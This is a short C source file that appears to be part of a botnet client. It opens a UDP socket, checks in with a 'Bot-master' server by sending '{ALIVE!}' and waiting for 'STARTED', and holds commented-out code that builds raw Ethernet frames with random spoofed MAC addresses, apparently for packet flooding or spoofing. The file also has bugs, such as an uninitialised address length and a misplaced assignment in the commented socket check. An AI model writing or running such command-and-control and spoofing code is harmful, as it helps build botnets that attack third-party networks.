#include "packet.h"
/*
int make_raw_socket(void)
{
    int s;
    if(s = socket(PF_PACKET, SOCK_RAW, ETH_P_IP) == ERROR)
    {
        perror("Failed to create raw socket");
        exit(1);
    }
    return s;
}*/

int make_socket(void)
{
    int s;
    if((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == ERROR) {
        perror("Failed to create socket");
        _exit(1);
    }
    printf("Socket = %d\n", s);
    return s;
}

int connect_to(int s, char *ip_str, short port, struct sockaddr_in *server)
{
    char temp[10];
    int addr_len;
    server->sin_family = AF_INET;
    server->sin_port = htons(port);
    server->sin_addr.s_addr = inet_addr(ip_str);
    memset(server->sin_zero, '\x00', sizeof(server->sin_zero));  
    if (inet_aton(ip_str , &server->sin_addr) == 0) 
    {
        fprintf(stderr, "inet_aton failed\n");
        _exit(1);
    }
    sendto(s, "{ALIVE!}", 8, 0, (struct sockaddr *)server, sizeof (struct sockaddr));
    recvfrom(s, temp, 10, 0, (struct sockaddr *)server, &addr_len);
    if(strncmp(temp, "STARTED", 7) == 0)
        printf("Connected to Bot-master\n"); // DEBUG
    else
        _exit(1);
}

/*
int fill_mac(struct ethhdr *ethernet_hdr)
{
    short protocol = 0x0800;
    char d_mac[18];
    char s_mac[18];
    
    // Filling Mac with garbage.
    sprintf(d_mac, "%02x:%02x:%02x:%02x:%02x:%02x", rand()%255, rand()%255, rand()%255, rand()%255, rand()%255, rand()%255);
    sprintf(s_mac, "%02x:%02x:%02x:%02x:%02x:%02x", rand()%255, rand()%255, rand()%255, rand()%255, rand()%255, rand()%255);

    memcpy(ethernet_hdr->h_dest, ether_aton(d_mac), 6);
    memcpy(ethernet_hdr->h_source, ether_aton(s_mac), 6);
    ethernet_hdr->h_proto = htons(protocol);
}
*/
